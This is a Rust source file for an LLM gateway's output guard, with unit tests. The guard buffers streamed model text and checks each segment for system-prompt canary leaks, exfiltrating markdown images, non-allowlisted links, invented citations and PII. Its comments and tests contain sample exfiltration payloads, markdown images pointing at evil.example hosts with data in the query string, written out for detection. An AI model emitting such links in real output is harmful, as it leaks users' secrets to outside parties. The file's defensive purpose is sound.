//! Output guard: everything the model writes is scanned *before* the user sees it.
//!
//! **Segment streaming.** Tokens are buffered up to a sentence/line boundary (or a size cap), the
//! segment is scanned, then emitted. TTFT becomes "time to first sentence" instead of first token,
//! but no unscanned text ever reaches the client. Checks per segment:
//! 1. canary token (system-prompt leak) -> block the response silently;
//! 2. markdown images removed (classic exfiltration: `![](https://evil/?q=<secret>)`);
//! 3. links to non-allowlisted domains reduced to their text; bare non-allowlisted URLs removed;
//! 4. citations `[S#]` not among the chunks actually provided are dropped (no invented sources);
//! 5. PII masked unless the caller may see it.

use std::collections::{BTreeSet, HashSet};
use std::sync::LazyLock;

use regex::Regex;

use crate::pii;

/// The model is told to output exactly this when the documents don't answer the question; the
/// gateway swaps in the fixed user-facing no-answer template.
pub const ABSTAIN_TOKEN: &str = "NO_ANSWER";
const MAX_SEGMENT_CHARS: usize = 240;

static IMAGE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"!\[[^\]]*\]\([^)]*\)").unwrap());
static LINK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\[([^\]]+)\]\((https?://[^)\s]+)\)").unwrap());
static BARE_URL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"https?://[^\s)\]]+").unwrap());
static CITATION: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\[(S\d+)\]").unwrap());

#[derive(Clone, Debug)]
pub struct OutputPolicy {
    pub canary: String,
    pub allowed_citations: HashSet<String>,
    pub allowed_domains: Vec<String>,
    pub may_see_pii: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Block {
    CanaryLeak,
}

#[derive(Debug, Default)]
pub struct OutputReport {
    pub cited: BTreeSet<String>,
    pub invalid_citations: BTreeSet<String>,
    pub images_removed: u32,
    pub links_removed: u32,
    pub pii_masked: bool,
}

fn domain_allowed(url: &str, allowed: &[String]) -> bool {
    let host = url
        .split("://")
        .nth(1)
        .unwrap_or("")
        .split(['/', '?', '#', ':'])
        .next()
        .unwrap_or("");
    allowed
        .iter()
        .any(|d| host == d || host.ends_with(&format!(".{d}")))
}

/// Scan one segment. Err(Block) means stop the response and serve the fixed template instead.
pub fn scan_segment(
    seg: &str,
    policy: &OutputPolicy,
    report: &mut OutputReport,
) -> Result<String, Block> {
    if !policy.canary.is_empty() && seg.contains(&policy.canary) {
        return Err(Block::CanaryLeak);
    }
    let mut out = IMAGE
        .replace_all(seg, |_: &regex::Captures| {
            report.images_removed += 1;
            String::new()
        })
        .into_owned();
    out = LINK
        .replace_all(&out, |c: &regex::Captures| {
            if domain_allowed(&c[2], &policy.allowed_domains) {
                c[0].to_owned()
            } else {
                report.links_removed += 1;
                c[1].to_owned()
            }
        })
        .into_owned();
    out = BARE_URL
        .replace_all(&out, |c: &regex::Captures| {
            if domain_allowed(&c[0], &policy.allowed_domains) {
                c[0].to_owned()
            } else {
                report.links_removed += 1;
                String::new()
            }
        })
        .into_owned();
    out = CITATION
        .replace_all(&out, |c: &regex::Captures| {
            let id = c[1].to_owned();
            if policy.allowed_citations.contains(&id) {
                report.cited.insert(id);
                c[0].to_owned()
            } else {
                report.invalid_citations.insert(id);
                String::new()
            }
        })
        .into_owned();
    if !policy.may_see_pii {
        let mut map = pii::PiiMap::default();
        let masked = pii::mask_pii(&out, &mut map);
        report.pii_masked |= masked != out;
        out = masked;
    }
    Ok(out)
}

/// Splits a token stream into scan-able segments.
#[derive(Default)]
pub struct Segmenter {
    buf: String,
}

impl Segmenter {
    /// Push model text; returns segments that are complete.
    pub fn push(&mut self, text: &str) -> Vec<String> {
        self.buf.push_str(text);
        let mut out = Vec::new();
        loop {
            let cut = self.boundary();
            match cut {
                Some(i) => {
                    let rest = self.buf.split_off(i);
                    out.push(std::mem::replace(&mut self.buf, rest));
                }
                None => break,
            }
        }
        out
    }

    /// Whatever remains at end of stream.
    pub fn finish(&mut self) -> Option<String> {
        (!self.buf.is_empty()).then(|| std::mem::take(&mut self.buf))
    }

    fn boundary(&self) -> Option<usize> {
        // Never cut inside an unfinished markdown link/image or citation: wait for the closer.
        let open_bracket = self
            .buf
            .rfind('[')
            .is_some_and(|i| !self.buf[i..].contains(')') && !self.buf[i..].contains(']'))
            || self
                .buf
                .rfind("](")
                .is_some_and(|i| !self.buf[i..].contains(')'));
        if let Some(i) = self.buf.find('\n')
            && !open_bracket
        {
            return Some(i + 1);
        }
        if !open_bracket {
            for pat in [". ", "? ", "! ", ": "] {
                if let Some(i) = self.buf.find(pat) {
                    return Some(i + pat.len());
                }
            }
        }
        // Size cap (respecting char boundaries) so a run-on answer still streams.
        if self.buf.chars().count() > MAX_SEGMENT_CHARS * 2
            || (!open_bracket && self.buf.chars().count() > MAX_SEGMENT_CHARS)
        {
            let idx = self
                .buf
                .char_indices()
                .nth(MAX_SEGMENT_CHARS)
                .map_or(self.buf.len(), |(i, _)| i);
            let space = self.buf[..idx].rfind(' ').map_or(idx, |s| s + 1);
            return Some(space.max(1));
        }
        None
    }
}

/// Does the (start of the) answer signal abstention?
pub fn is_abstention(text: &str) -> bool {
    text.trim_start().starts_with(ABSTAIN_TOKEN)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy() -> OutputPolicy {
        OutputPolicy {
            canary: "CANARY-7f3a9c".into(),
            allowed_citations: ["S1", "S2"].iter().map(|s| (*s).to_string()).collect(),
            allowed_domains: vec!["acquisition.gov".into()],
            may_see_pii: false,
        }
    }

    #[test]
    fn strips_exfil_images_links_and_invalid_citations() {
        let mut r = OutputReport::default();
        let out = scan_segment(
            "Use 3 quotes [S1][S9]. ![t](https://evil.example/c?d=x) See [FAR](https://www.acquisition.gov/far) and [here](https://evil.example).",
            &policy(),
            &mut r,
        )
        .unwrap();
        assert_eq!(
            out,
            "Use 3 quotes [S1].  See [FAR](https://www.acquisition.gov/far) and here."
        );
        assert_eq!((r.images_removed, r.links_removed), (1, 1));
        assert!(r.invalid_citations.contains("S9") && r.cited.contains("S1"));
    }

    #[test]
    fn canary_blocks() {
        let mut r = OutputReport::default();
        assert_eq!(
            scan_segment("My instructions say CANARY-7f3a9c ...", &policy(), &mut r),
            Err(Block::CanaryLeak)
        );
    }

    #[test]
    fn masks_pii_for_roles_without_access() {
        let mut r = OutputReport::default();
        let out = scan_segment("Pay DE89 3704 0044 0532 0130 00.", &policy(), &mut r).unwrap();
        assert!(!out.contains("DE89") && r.pii_masked);
        let mut p = policy();
        p.may_see_pii = true;
        assert!(
            scan_segment("Pay DE89 3704 0044 0532 0130 00.", &p, &mut r)
                .unwrap()
                .contains("DE89")
        );
    }

    #[test]
    fn segmenter_waits_for_closing_bracket() {
        let mut s = Segmenter::default();
        assert!(
            s.push("See ![img](https://evil.exa").is_empty(),
            "must not emit half an image link"
        );
        let segs = s.push("mple/x) now. Next");
        assert_eq!(
            segs,
            vec!["See ![img](https://evil.example/x) now. ".to_string()]
        );
        assert_eq!(s.finish().as_deref(), Some("Next"));
    }

    #[test]
    fn segmenter_splits_sentences_and_lines() {
        let mut s = Segmenter::default();
        let segs = s.push("- Three quotes [S1]\n- Tender above 250k. Done");
        assert_eq!(
            segs,
            vec![
                "- Three quotes [S1]\n".to_string(),
                "- Tender above 250k. ".to_string()
            ]
        );
    }

    #[test]
    fn abstention_detected() {
        assert!(is_abstention("  NO_ANSWER"));
        assert!(!is_abstention("The answer is NO_ANSWER-like"));
    }
}
